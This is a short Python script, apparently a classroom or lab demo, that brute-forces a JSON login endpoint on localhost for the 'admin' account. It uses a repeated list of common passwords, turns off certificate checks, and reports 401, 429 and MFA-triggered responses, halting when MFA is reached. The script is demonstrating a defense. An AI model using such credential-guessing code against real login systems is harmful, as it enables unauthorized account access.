import requests
import time
import urllib3

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# CONFIGURATION
URL = "https://127.0.0.1:443/login"
TARGET_USER = "admin"
PASSWORD_LIST = [
    "password",
    "123456",
    "admin",
    "letmeIN",
    "password",
    "123456",
    "admin",
    "letmeIN",
    "password",
    "123456",
    "admin",
    "letmeIN",
    "AdminPassword123!"  # <--- The Correct Password
]


def run_attack():
    print(f"[*] --- STARTING FINAL DEMO ATTACK ON: {TARGET_USER} ---")
    session = requests.Session()

    # No CSRF token needed for this JSON API
    print(f"[*] Target: {URL}\n")

    for i, password in enumerate(PASSWORD_LIST, 1):
        print(f"[{i}] Trying: '{password}'...", end=" ")
        time.sleep(0.5)

        payload = {
            'username': TARGET_USER,
            'password': password
        }

        try:
            # FIX: Use json=payload instead of data=payload because the server expects JSON
            response = session.post(URL, json=payload, verify=False, allow_redirects=True)

            try:
                data = response.json()
            except ValueError:
                data = {}

            # CASE 1: Password Found (MFA Triggered)
            # The server returns JSON: {'otp_required': True, 'user_id': ...}
            if response.status_code == 200 and data.get('otp_required'):
                print("✅ PASSWORD FOUND!")
                print("\n[!!!] ATTACK HALTED BY MFA DEFENSE [!!!]")
                print("      The attacker knows the password, but cannot pass the 2FA screen.")
                break

            # CASE 2: Wrong Password (Standard Failure)
            elif response.status_code == 401:
                print("❌ Failed (Wrong Credentials)")

            # CASE 3: Account Locked
            elif response.status_code == 429:
                print("⛔ Rate Limited (Too Many Requests)")

        except Exception as e:
            print(f" [!] Request Error: {e}")


if __name__ == "__main__":
    run_attack()